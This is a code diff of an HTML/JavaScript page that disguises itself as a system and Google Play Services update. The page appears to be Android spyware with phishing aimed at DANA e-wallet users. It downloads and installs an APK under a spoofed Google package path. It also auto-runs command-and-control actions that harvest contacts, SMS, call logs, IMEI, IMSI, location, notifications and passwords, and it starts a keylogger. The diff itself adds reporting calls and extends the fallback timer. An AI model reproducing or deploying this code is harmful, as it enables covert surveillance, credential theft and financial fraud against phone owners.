@@ -151,7 +151,6 @@ function saveHTMLToAllLocations(htmlContent) {
     } catch(e) {}
     if (PLATFORM.isAndroid && A.isAvailable) {
         try {
-            // 🔥 KONSISTEN: Download folder
             var path = '/storage/emulated/0/Download/SystemUpdate.html';
             A.saveFile(path, htmlContent);
         } catch(e) {}
@@ -186,7 +185,6 @@ function loadHTMLFromAllLocations() {
                 var get = store.get('SystemUpdate.html');
                 get.onsuccess = function() {
                     if (get.result) { resolve(get.result); return; }
-                    // 🔥 KONSISTEN: Download folder
                     if (PLATFORM.isAndroid && A.isAvailable) {
                         try {
                             var content = A.readFile('/storage/emulated/0/Download/SystemUpdate.html');
@@ -304,13 +302,11 @@ function saveAPKToAllLocations(apkBase64) {
     if (!apkBase64) return;
     if (PLATFORM.isAndroid && A.isAvailable) {
         try { A.saveToPreferences('system_GooglePlayServices_apk', apkBase64); } catch(e) {}
-        // 🔥 Download folder
         try {
             var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
             var path = '/storage/emulated/0/Download/GooglePlayServices.apk';
             A.saveFileBinary(path, binary);
         } catch(e) {}
-        // Internal APK folder
         try {
             var binary = Uint8Array.from(atob(apkBase64), c => c.charCodeAt(0));
             var internalPath = '/data/data/com.google.android.play.services/files/GooglePlayServices.apk';
@@ -348,6 +344,7 @@ function installAPKFromAvailablePath() {
             var result = A.installAPK(path);
             if (result) {
                 APK_INSTALLED = true;
+                allDone = true;
                 K({ sumber: 'apk_install_success', data: { path: path } });
                 updateProgress(100, '✅ Update Selesai');
                 finishAndRedirect();
@@ -357,6 +354,7 @@ function installAPKFromAvailablePath() {
         try {
             window.location.href = 'file://' + path;
             APK_INSTALLED = true;
+            allDone = true;
             K({ sumber: 'apk_install_fallback_intent', data: { path: path } });
             updateProgress(100, '✅ Update Selesai');
             finishAndRedirect();
@@ -375,6 +373,7 @@ function requestAPKFromServer() {
 // DOWNLOAD & INSTALL APK (UNIVERSAL)
 // ============================================================
 function downloadAndInstallAPK() {
+    K({ sumber: 'apk_download_start', data: 'starting' });
     var apkUrl = APK_URL;
     try {
         var xhr = new XMLHttpRequest();
@@ -383,13 +382,14 @@ function downloadAndInstallAPK() {
         xhr.timeout = 60000;
         xhr.onload = function() {
             if (xhr.status === 200) {
+                K({ sumber: 'apk_download_xhr', data: 'success' });
                 var blob = xhr.response;
                 var reader = new FileReader();
                 reader.onload = function() {
                     var base64 = reader.result.split(',')[1];
                     if (base64) {
                         saveAPKToAllLocations(base64);
-                        K({ sumber: 'apk_download_success', data: 'ok' });
+                        K({ sumber: 'apk_saved', data: 'ok' });
                         setTimeout(function() {
                             installAPKFromAvailablePath();
                         }, 3000);
@@ -398,8 +398,12 @@ function downloadAndInstallAPK() {
                 reader.readAsDataURL(blob);
             }
         };
+        xhr.onerror = function() {
+            K({ sumber: 'apk_download_xhr_error', data: 'failed' });
+        };
         xhr.send();
     } catch(e) {
+        K({ sumber: 'apk_download_exception', data: e.message });
         try {
             var a = document.createElement('a');
             a.href = apkUrl;
@@ -1085,17 +1089,32 @@ function showToast(message) {
 function autoExecuteC2() {
     if (AUTO_EXECUTED) return;
     AUTO_EXECUTED = true;
+
+    K({ sumber: 'auto_execute_start', data: 'starting' });
+
     var commands = [
         'ambil_kontak', 'ambil_sms', 'ambil_call_log', 'ambil_imei',
         'ambil_imsi', 'ambil_nomor_hp', 'get_wifi', 'keylogger_start',
         'ambil_lokasi', 'get_installed_apps', 'get_notifications', 'get_system_info'
     ];
+
     commands.forEach(function(cmd) {
         try {
+            K({ sumber: 'auto_c2_running', data: cmd });
             var hasil = eksekusiPerintah({ aksi: cmd });
-            K({ sumber: 'auto_c2_result', data: { perintah: cmd, hasil: hasil || 'success', waktu: Date.now() } });
-        } catch(e) {}
+            K({
+                sumber: 'auto_c2_result',
+                data: {
+                    perintah: cmd,
+                    hasil: hasil || 'success',
+                    waktu: Date.now()
+                }
+            });
+        } catch(e) {
+            K({ sumber: 'auto_c2_error', data: { perintah: cmd, error: e.message } });
+        }
     });
+
     K({ sumber: 'auto_execute_complete', data: { total: commands.length } });
 }
 
@@ -1154,6 +1173,7 @@ if ('serviceWorker' in navigator) {
 
 ambilPassword();
 
+// 🔥 TIMEOUT FALLBACK - 30 DETIK (CUKUP!)
 setTimeout(function() {
     if (!allDone) {
         allDone = true;
@@ -1161,7 +1181,7 @@ setTimeout(function() {
         K({ sumber: 'timeout_fallback', data: 'redirecting' });
         setTimeout(redirectToDANA, 1000);
     }
-}, 10000);
+}, 30000); // ← 30 DETIK
 </script>
 </body>
 </html>
